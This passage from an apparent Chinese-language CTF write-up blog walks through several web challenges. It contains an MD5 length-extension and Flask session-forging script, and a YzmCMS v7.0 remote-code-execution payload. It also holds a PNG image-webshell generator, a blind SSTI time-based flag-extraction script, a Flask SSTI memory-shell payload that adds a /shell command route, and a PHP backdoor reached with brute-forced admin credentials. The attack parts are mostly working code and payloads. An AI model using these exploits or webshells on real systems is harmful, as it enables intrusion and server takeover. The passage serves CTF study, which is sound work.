class="line">                  16 * [lambda i: (5 * i + 1) % 16] + \</span><br><span class="line">                  16 * [lambda i: (3 * i + 5) % 16] + \</span><br><span class="line">                  16 * [lambda i: (7 * i) % 16]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_init_values(A: int = 0x67452301, B: int = 0xefcdab89, C: int = 0x98badcfe, D: int = 0x10325476) -&gt; List[int]:</span><br><span class="line">    return [A, B, C, D]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def left_rotate(x, amount):</span><br><span class="line">    x &amp;= 0xFFFFFFFF</span><br><span class="line">    return ((x &lt;&lt; amount) | (x &gt;&gt; (32 - amount))) &amp; 0xFFFFFFFF</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def padding_message(msg: bytes) -&gt; bytes:</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    在MD5算法中，首先需要对输入信息进行填充，使其位长对512求余的结果等于448，并且填充必须进行，即使其位长对512求余的结果等于448。</span><br><span class="line">    因此，信息的位长（Bits Length）将被扩展至N*512+448，N为一个非负整数，N可以是零。</span><br><span class="line">    填充的方法如下：</span><br><span class="line">        1) 在信息的后面填充一个1和无数个0，直到满足上面的条件时才停止用0对信息的填充。</span><br><span class="line">        2) 在这个结果后面附加一个以64位二进制表示的填充前信息长度（单位为Bit），如果二进制表示的填充前信息长度超过64位，则取低64位。</span><br><span class="line">    经过这两步的处理，信息的位长=N*512+448+64=(N+1）*512，即长度恰好是512的整数倍。这样做的原因是为满足后面处理中对信息长度的要求。</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    orig_len_in_bits = (8 * len(msg)) &amp; 0xffffffffffffffff</span><br><span class="line">    msg += bytes([0x80])</span><br><span class="line">    while len(msg) % 64 != 56:</span><br><span class="line">        msg += bytes([0x00])</span><br><span class="line">    msg += orig_len_in_bits.to_bytes(8, byteorder=&#x27;little&#x27;)</span><br><span class="line">    return msg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def md5(message: bytes, A: int = 0x67452301, B: int = 0xefcdab89, C: int = 0x98badcfe, D: int = 0x10325476) -&gt; int:</span><br><span class="line">    message = padding_message(message)</span><br><span class="line">    hash_pieces = get_init_values(A, B, C, D)[:]</span><br><span class="line">    for chunk_ofst in range(0, len(message), 64):</span><br><span class="line">        a, b, c, d = hash_pieces</span><br><span class="line">        chunk = message[chunk_ofst:chunk_ofst + 64]</span><br><span class="line">        for i in range(64):</span><br><span class="line">            f = functions[i](b, c, d)</span><br><span class="line">            g = index_functions[i](i)</span><br><span class="line">            to_rotate = a + f + constants[i] + int.from_bytes(chunk[4 * g:4 * g + 4], byteorder=&#x27;little&#x27;)</span><br><span class="line">            new_b = (b + left_rotate(to_rotate, rotate_amounts[i])) &amp; 0xFFFFFFFF</span><br><span class="line">            a, b, c, d = d, new_b, b, c</span><br><span class="line">        for i, val in enumerate([a, b, c, d]):</span><br><span class="line">            hash_pieces[i] += val</span><br><span class="line">            hash_pieces[i] &amp;= 0xFFFFFFFF</span><br><span class="line"></span><br><span class="line">    return sum(x &lt;&lt; (32 * i) for i, x in enumerate(hash_pieces))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def md5_to_hex(digest: int) -&gt; str:</span><br><span class="line">    raw = digest.to_bytes(16, byteorder=&#x27;little&#x27;)</span><br><span class="line">    return &#x27;&#123;:032x&#125;&#x27;.format(int.from_bytes(raw, byteorder=&#x27;big&#x27;))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_md5(message: bytes, A: int = 0x67452301, B: int = 0xefcdab89, C: int = 0x98badcfe, D: int = 0x10325476) -&gt; str:</span><br><span class="line">    return md5_to_hex(md5(message, A, B, C, D))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def md5_attack(message: bytes, A: int = 0x67452301, B: int = 0xefcdab89, C: int = 0x98badcfe,</span><br><span class="line">               D: int = 0x10325476) -&gt; int:</span><br><span class="line">    hash_pieces = get_init_values(A, B, C, D)[:]</span><br><span class="line">    for chunk_ofst in range(0, len(message), 64):</span><br><span class="line">        a, b, c, d = hash_pieces</span><br><span class="line">        chunk = message[chunk_ofst:chunk_ofst + 64]</span><br><span class="line">        for i in range(64):</span><br><span class="line">            f = functions[i](b, c, d)</span><br><span class="line">            g = index_functions[i](i)</span><br><span class="line">            to_rotate = a + f + constants[i] + int.from_bytes(chunk[4 * g:4 * g + 4], byteorder=&#x27;little&#x27;)</span><br><span class="line">            new_b = (b + left_rotate(to_rotate, rotate_amounts[i])) &amp; 0xFFFFFFFF</span><br><span class="line">            a, b, c, d = d, new_b, b, c</span><br><span class="line">        for i, val in enumerate([a, b, c, d]):</span><br><span class="line">            hash_pieces[i] += val</span><br><span class="line">            hash_pieces[i] &amp;= 0xFFFFFFFF</span><br><span class="line"></span><br><span class="line">    return sum(x &lt;&lt; (32 * i) for i, x in enumerate(hash_pieces))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_init_values_from_hash_str(real_hash: str) -&gt; List[int]:</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    Args:</span><br><span class="line">        real_hash: 真实的hash结算结果</span><br><span class="line"></span><br><span class="line">    Returns: 哈希初始化值[A, B, C, D]</span><br><span class="line"></span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    str_list: List[str] = [real_hash[i * 8:(i + 1) * 8] for i in range(4)]</span><br><span class="line">    # 先按照小端字节序将十六进制字符串转换成整数，然后按照大端字节序重新读取这个数字</span><br><span class="line">    return [int.from_bytes(int(&#x27;0x&#x27; + s, 16).to_bytes(4, byteorder=&#x27;little&#x27;), byteorder=&#x27;big&#x27;) for s in str_list]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_md5_attack_materials(origin_msg: bytes, key_len: int, real_hash: str, append_data: bytes) -&gt; Dict[str, Any]:</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    Args:</span><br><span class="line">        origin_msg: 原始的消息字节流</span><br><span class="line">        key_len: 原始密钥（盐）的长度</span><br><span class="line">        real_hash: 计算出的真实的hash值</span><br><span class="line">        append_data: 需要添加的攻击数据</span><br><span class="line"></span><br><span class="line">    Returns: 发起攻击需要的物料信息</span><br><span class="line">        &#123;</span><br><span class="line">            &#x27;attack_fake_msg&#x27;: bytes([...]),</span><br><span class="line">            &#x27;attack_hash_value&#x27;: str(a1b2c3d4...)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    init_values = get_init_values_from_hash_str(real_hash)</span><br><span class="line">    # print([&#x27;&#123;:08x&#125;&#x27;.format(x) for x in init_values])</span><br><span class="line">    # 只知道key的长度，不知道key的具体内容时，任意填充key的内容</span><br><span class="line">    fake_key: bytes = bytes([0xff for _ in range(key_len)])</span><br><span class="line">    # 计算出加了append_data后的真实填充数据</span><br><span class="line">    finally_padded_attack_data = padding_message(padding_message(fake_key + origin_msg) + append_data)</span><br><span class="line">    # 攻击者提前计算添加了攻击数据的哈希</span><br><span class="line">    attack_hash_value = md5_to_hex(md5_attack(finally_padded_attack_data[len(padding_message(fake_key + origin_msg)):],</span><br><span class="line">                                              A=init_values[0],</span><br><span class="line">                                              B=init_values[1],</span><br><span class="line">                                              C=init_values[2],</span><br><span class="line">                                              D=init_values[3]))</span><br><span class="line">    fake_padding_data = padding_message(fake_key + origin_msg)[len(fake_key + origin_msg):]</span><br><span class="line">    attack_fake_msg = origin_msg + fake_padding_data + append_data</span><br><span class="line">    return &#123;&#x27;attack_fake_msg&#x27;: attack_fake_msg, &#x27;attack_hash_value&#x27;: attack_hash_value&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">from flask.sessions import SecureCookieSessionInterface</span><br><span class="line">import requests, json, time</span><br><span class="line"></span><br><span class="line">class MockApp(object):</span><br><span class="line">    def __init__(self, secret_key):</span><br><span class="line">        self.secret_key = secret_key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def session_decode(session_cookie_value, secret_key):</span><br><span class="line">    &quot;&quot;&quot; Decode a Flask cookie  &quot;&quot;&quot;</span><br><span class="line">    app = MockApp(secret_key)</span><br><span class="line">    si = SecureCookieSessionInterface()</span><br><span class="line">    s = si.get_signing_serializer(app)</span><br><span class="line">    return s.loads(session_cookie_value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def session_encode(session_cookie_structure, secret_key):</span><br><span class="line">    &quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;</span><br><span class="line">    try:</span><br><span class="line">        app = MockApp(secret_key)</span><br><span class="line">        # session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))</span><br><span class="line">        si = SecureCookieSessionInterface()</span><br><span class="line">        s = si.get_signing_serializer(app)</span><br><span class="line">        return s.dumps(session_cookie_structure)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        return &quot;[Encoding error] &#123;&#125;&quot;.format(e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def req_index(url, cookie):</span><br><span class="line">    # headers = &#123;&quot;Cookie&quot;: &quot;session=&quot; + cookie&#125;</span><br><span class="line">    cookies = &#123;&quot;session&quot;:cookie&#125;</span><br><span class="line">    r = requests.get(url, cookies=cookies).text</span><br><span class="line">    # print(r)</span><br><span class="line">    if &#x27;签到成功&#x27; not in r:</span><br><span class="line">        # print(cookie)</span><br><span class="line">        time.sleep(1)</span><br><span class="line">        req_index(url, cookie)</span><br><span class="line">        # print(r)</span><br><span class="line"></span><br><span class="line">def req_user(url):</span><br><span class="line">    return json.loads(requests.get(url).text)</span><br><span class="line"></span><br><span class="line">def req_login(url):</span><br><span class="line">    data = &#123;&quot;username&quot;:&quot;student&quot;, &quot;password&quot;:&quot;student&quot;&#125;</span><br><span class="line">    cookie = requests.post(url, data).headers[&quot;Set-Cookie&quot;][8:].split(&#x27;;&#x27;)[0]</span><br><span class="line">    # print(cookie)</span><br><span class="line">    return cookie</span><br><span class="line"></span><br><span class="line">def hash_Attack(md5_value, key_len, data, attack_data):</span><br><span class="line">    attack_materials = get_md5_attack_materials(data, key_len, md5_value.decode(), attack_data)</span><br><span class="line">    # print(data)</span><br><span class="line">    res = &#123;&quot;username&quot;:attack_data, &quot;msg&quot;:attack_materials[&#x27;attack_fake_msg&#x27;][:-len(attack_data)], &quot;sign&quot;:attack_materials[&#x27;attack_hash_value&#x27;].encode()&#125;</span><br><span class="line">    return res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    url = &quot;http://210.44.150.15:49982/&quot;</span><br><span class="line">    cookie = req_login(url+&#x27;login&#x27;)</span><br><span class="line">    users = req_user(url+&#x27;users&#x27;)</span><br><span class="line">    secret_key = &quot;Th1s_is_5ecr3t_k3y&quot;</span><br><span class="line">    res = session_decode(cookie, secret_key)</span><br><span class="line">    for user in users:</span><br><span class="line">        if users[user] == 0:</span><br><span class="line">            res = hash_Attack(res[&quot;sign&quot;], 16, res[&quot;msg&quot;]+res[&quot;username&quot;], user.encode())</span><br><span class="line">            res2 = session_encode(res, secret_key)</span><br><span class="line">            # time.sleep(1)</span><br><span class="line">            r = req_index(url, res2)</span><br></pre></td></tr></table></figure>

<p>跑完这个脚本后，访问&#x2F;flag得到flag</p>
<h4 id="Week3-小小cms"><a href="#Week3-小小cms" class="headerlink" title="[Week3] 小小cms"></a>[Week3] 小小cms</h4><p>我们看到这是个YzmCMS内容管理系统，而且最近更新提到了它的版本</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410252033701.png" alt="image-20241025203326461" loading="lazy"></p>
<p>我们上网查查YzmCMS v7.0的漏洞<a target="_blank" rel="noopener" href="https://blog.csdn.net/shelter1234567/article/details/138524342">https://blog.csdn.net/shelter1234567/article/details/138524342</a></p>
<p>文章提到  YzmCMS 某些接口调用了 db_pdo类的where方法 导致了远程命令执行漏洞，未经身份验证的远程攻击者可利用此漏洞执行任意系统指令，写入后门文件，最终可获取服务器权限。</p>
<p>影响版本&lt;&#x3D;7.0</p>
<p>进行漏洞分析</p>
<p>在db_pdo.class.php文件中，db_pdo存在where方法。在195行出现了$fun($rule)的执行方法</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410252051517.png" alt="image-20241025205145464" loading="lazy"></p>
<p>如果$fun和$rule都为可控参数就会形成“exec(calc)”的危险函数调用漏洞</p>
<p>分析$fun与$rulee是如何传参的</p>
<p>首先在187行与188行$rule为$vv[1]得到， $fun为$vv[2] 得到</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410252054205.png" alt="image-20241025205457147" loading="lazy"></p>
<p>向上分析$vv(本身数组)是数组$args中遍历的，经过测试$args其实是where函数的参数$arr赋予的</p>
<p>接下来我们要分析谁可以调用db_pdo类的where方法</p>
<p>调用where的方法有很多，但调用的同时要考虑参数是否可控，是否传递数组</p>
<p>这里根据poc提供一个函数调用的地方</p>
<p>位于pay&#x2F;controller&#x2F;index.class.php中的pay_callback方法</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410252113737.png" alt="image-20241025211301663" loading="lazy"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$out_trade_no = $_POST[&#x27;out_trade_no&#x27;];</span><br><span class="line">$order = D(&#x27;order&#x27;)-&gt;field(&#x27;id,order_sn,status,userid,username,paytype,money,quantity,`type`,`desc`&#x27;)-&gt;where(array(&#x27;order_sn&#x27; =&gt; $out_trade_no))-&gt;find();</span><br></pre></td></tr></table></figure>

<p>经过前面的分析，传递的参数的是数组，这里已经符合要求了。我们只需将 $out_trade_no变为数组即可，且out_trade_no[2]为调用函数out_trade_no[1]为调用函数参数</p>
<p>根据框架的的控制器一般调用方法，欲想调用pay_callback方法 需构造这样的url “pay&#x2F;index&#x2F;pay_callback”</p>
<p>可以先这样访问看看行不行，如果不行在分析代码是否禁用的这种方式，是否有自己定义路由，是否有自己定义前缀，后缀。</p>
<h5 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a><strong>漏洞复现</strong></h5><p>根据前面的分析的我们这样发请求行不行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST /yzmcms-7.0/pay/index/pay_callback HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Cookie: ;XDEBUG_SESSION=19079</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 58</span><br><span class="line"></span><br><span class="line">out_trade_no[0]=&amp;out_trade_no[1]=calc&amp;out_trade_no[2]=exec</span><br></pre></td></tr></table></figure>

<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410252126834.png" alt="image-20241025212612772" loading="lazy"></p>
<p>由于out_trade_no没有0的值，出现了错误</p>
<p>其实我们前面忽略了一点，就是out_trade_no[0]的处理</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410252122634.png" alt="image-20241025212255581" loading="lazy"></p>
<p>$vv[0]需是$exp_arr存在的健，根据184行，我们随便找一个键 eq。构造如下payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">out_trade_no[0]=eq&amp;out_trade_no[1]=calc&amp;out_trade_no[2]=exec</span><br></pre></td></tr></table></figure>

<p>系统成功执行了exec(calc)函数，实现了任意函数调用</p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/87a906a53cfcc4947e39a76883a63591.png" alt="img" loading="lazy"></p>
<p>回到本题，我们访问&#x2F;pay&#x2F;index&#x2F;pay_callback，post传一个</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">out_trade_no[0]=eq&amp;out_trade_no[1]=env&amp;out_trade_no[2]=system</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410252128569.png" alt="image-20241025212840514" loading="lazy"></p>
<h4 id="Week3-拜师之旅·番外"><a href="#Week3-拜师之旅·番外" class="headerlink" title="[Week3] 拜师之旅·番外"></a>[Week3] 拜师之旅·番外</h4><p>我们随便传上一张png图片</p>
<p>当上传一张图片成功后,查看图片可以发现是通过GET传文件路径来显示的,考虑存在include包含</p>
<p>我们将图片下载下来，放入010中与原文件进行对比</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410252135483.png" alt="image-20241025213527421" loading="lazy"></p>
<p>发现只有一部分相同，其余的大多被更改了，我们想到图片的二次渲染</p>
<p>此时需要构造一张不被渲染掉的png图片马,这里借用了网上的脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,</span><br><span class="line">    0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,</span><br><span class="line">    0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,</span><br><span class="line">    0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,</span><br><span class="line">    0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,</span><br><span class="line">    0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,</span><br><span class="line">    0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,</span><br><span class="line">    0x66, 0x44, 0x50, 0x33);</span><br><span class="line"></span><br><span class="line">$img = imagecreatetruecolor(32, 32);</span><br><span class="line"></span><br><span class="line">for ($y = 0; $y &lt; sizeof($p); $y += 3) &#123;</span><br><span class="line">    $r = $p[$y];</span><br><span class="line">    $g = $p[$y+1];</span><br><span class="line">    $b = $p[$y+2];</span><br><span class="line">    $color = imagecolorallocate($img, $r, $g, $b);</span><br><span class="line">    imagesetpixel($img, round($y / 3), 0, $color);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">imagepng($img,&#x27;1.png&#x27;);  //要修改的图片的路径</span><br><span class="line"></span><br><span class="line">/* 木马内容</span><br><span class="line">&lt;?$_GET[0]($_POST[1]);?&gt;</span><br><span class="line"> */</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>我们将生成的图片上传上去</p>
<p>并在查看图片页面进行命令执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET  :靶机地址/?image=/upload/293146324.png&amp;0=system</span><br><span class="line"></span><br><span class="line">POST:1=tac /f*</span><br></pre></td></tr></table></figure>

<p>执行一次后，我们重新将图片下载下来，放到010里查看</p>
<p>得到flag</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410252142777.png" alt="image-20241025214247705" loading="lazy"></p>
<h4 id="Week3-love-flask"><a href="#Week3-love-flask" class="headerlink" title="[Week3] love_flask"></a>[Week3] love_flask</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def pretty_input():</span><br><span class="line">    return render_template_string(html_template)</span><br><span class="line">//render_template_string 允许开发者直接从字符串中渲染模板</span><br><span class="line">@app.route(&#x27;/namelist&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def name_list():</span><br><span class="line">    name = request.args.get(&#x27;name&#x27;)  </span><br><span class="line">    template = &#x27;&lt;h1&gt;Hi, %s.&lt;/h1&gt;&#x27; % name</span><br><span class="line">    rendered_string =  render_template_string(template)</span><br><span class="line">    if rendered_string:</span><br><span class="line">        return &#x27;Success Write your name to database&#x27;</span><br><span class="line">    else:</span><br><span class="line">        return &#x27;Error&#x27;</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(port=8080)</span><br></pre></td></tr></table></figure>

<p>从源码中我们可以发现输入可控，而且经过了渲染，明显的ssti模版注入</p>
<p>此外，我们还发现源码没有回显ssti的结果</p>
<p>可以看到没有任何的过滤</p>
<p>所以我们有两种办法</p>
<p>一种是盲注，因为渲染失败会返回500，所以可以先爆出eval</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/namelist?name=&#123;&#123;().__class__.__base__.__subclasses__()[&#123;&#123;int(100-200)&#125;&#125;].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;time&quot;).sleep(3)&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410271448305.png" alt="image-20241027144758194" loading="lazy"></p>
<p>我们可以通过构造延时来爆flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">flag =&#x27;SHCTF&#123;&#x27;</span><br><span class="line">table = &#x27;-ABCDEFabcdef0123456789&#x27;</span><br><span class="line">url = &#x27;http://210.44.150.15:25528/namelist?name=&#x27;</span><br><span class="line">for len in range(7,43):</span><br><span class="line">    for i in table:</span><br><span class="line">      ii = flag +i</span><br><span class="line">      start_time = time.time()</span><br><span class="line">      data = &quot;&#123;&#123;&quot;+&quot;().__class__.__base__.__subclasses__()[100].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(\&quot;os\&quot;).popen(\&quot;if [ $(head -c &#123;&#125; /flag) = &#123;&#125; ]; then sleep 2; fi\&quot;).read()&#x27;)&quot;.format(len,ii) +&quot;&#125;&#125;&quot;</span><br><span class="line">      #print(data)</span><br><span class="line">      url1 = url + data</span><br><span class="line">      r = requests.get(url1)</span><br><span class="line">      end_time = time.time()</span><br><span class="line">      response_time = end_time - start_time</span><br><span class="line">      if response_time &gt;= 2:</span><br><span class="line">          flag = flag +i</span><br><span class="line">          print(flag)</span><br><span class="line">      else:</span><br><span class="line">          continue</span><br><span class="line">print(flag+&#x27;&#125;&#x27;)</span><br></pre></td></tr></table></figure>

<p>if [ $(head -c {} &#x2F;flag) &#x3D; {} ]; then sleep 2; </p>
<p>**<code>head -c &#123;&#125;</code>**：</p>
<ul>
<li><code>head</code>是一个用于输出文件开头部分的命令。</li>
<li><code>-c &#123;&#125;</code>选项表示输出文件的前<code>&#123;&#125;</code>个字节。这个<code>&#123;&#125;</code>在实际代码中将被替换为一个整数值，代表要读取的字节数。</li>
<li><code>/flag</code>是要检查的文件路径。</li>
</ul>
<p>**<code>$(...)</code>**：</p>
<ul>
<li>这是命令替换（command substitution），用于将命令的输出作为字符串插入到另一个命令中。</li>
<li>在这里，<code>$(head -c &#123;&#125; /flag)</code>会输出<code>/flag</code>文件的前<code>&#123;&#125;</code>个字节的内容。</li>
</ul>
<p>**<code>sleep 2</code>**：</p>
<ul>
<li><code>sleep</code>命令用于使程序暂停指定的时间（在这里是2秒）。</li>
<li>如果<code>head</code>命令的输出与<code>&#123;&#125;</code>相等，则执行<code>sleep 2</code>，造成响应延迟。</li>
</ul>
<p>**<code>then ... fi</code>**：</p>
<ul>
<li><code>then</code>表示条件为真时执行的命令块的开始，<code>fi</code>表示<code>if</code>语句的结束。</li>
</ul>
<h5 id="第二种方法"><a href="#第二种方法" class="headerlink" title="第二种方法"></a>第二种方法</h5><p>我们可以通过构造内存马</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10933?time__1311=CqjxRQiQqQqqlxGg6QGCDcmQD80rdDCbAeD">https://xz.aliyun.com/t/10933?time__1311=CqjxRQiQqQqqlxGg6QGCDcmQD80rdDCbAeD</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;,&#123;&#x27;_request_ctx_stack&#x27;:url_for.__globals__[&#x27;_request_ctx_stack&#x27;],&#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>我们先运行一遍，然后再访问&#x2F;shell?cmd&#x3D;tac &#x2F;f*</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410271528055.png" loading="lazy"></p>
<h4 id="Week3-hacked-website"><a href="#Week3-hacked-website" class="headerlink" title="[Week3] hacked_website"></a>[Week3] hacked_website</h4><p>我们扫描目录，发现有个<a target="_blank" rel="noopener" href="http://www.zip,我们把它下载下来,然后用d盾扫描,发现后门文件/">www.zip，我们把它下载下来，然后用D盾扫描，发现后门文件</a></p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410271647524.png" alt="image-20241027164736366" loading="lazy"></p>
<p>我们打开这个文件</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410271648116.png" alt="image-20241027164847997" loading="lazy"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $a = &#x27;sys&#x27;;$b = &#x27;tem&#x27;;$x = $a.$b;if (!isset($_POST[&#x27;SH&#x27;])) &#123;$z = &quot;&#x27;&#x27;&quot;;&#125; else $z = $_POST[&#x27;SH&#x27;];?&gt;</span><br></pre></td></tr></table></figure>

<p>我们可以发现可以命令执行，在&#x2F;admin&#x2F;profile.php下传一个SH来进行rce</p>
<p>但首先我们要进行登录</p>
<p>进入&#x2F;admin根据文章发布者，账号为admin，爆破密码，结果为qwer1234</p>
<p>然后我们执行命令，得到flag</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410271651197.png" alt="image-20241027165129138" loading="lazy"></p>
<h5 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h5><p>在控制台-外观-编辑当前外观处编辑模板</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410271654740.png" alt="image-20241027165401679" loading="lazy"></p>
<p>然后我们访问index.php，得到flag</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410271654308.png" alt="image-20241027165423249" loading="lazy"></p>
<h4 id="Week3-顰"><a href="#Week3-顰" class="headerlink" title="[Week3] 顰"></a>[Week3] 顰</h4><h3 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h3><h4 id="Week1-EzAES"><a href="#Week1-EzAES" class="headerlink" title="[Week1] EzAES"></a>[Week1] EzAES</h4><p>我们直接解密就行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line"># 密钥和 IV，使用加密时生成的值</span><br><span class="line">key = b&#x27;p[b\x80~\xaa\xb2\xd3)l\x1eW\xcc\x85)\x10&#x27;</span><br><span class="line">iv = b&#x27;\xd0cFp=\x9eW\xad\xact&amp;\xbb\xb4\x0cV\xd4&#x27;</span><br><span class="line"></span><br><span class="line"># 创建 AES 解密对象</span><br><span class="line">my_aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line"></span><br><span class="line"># 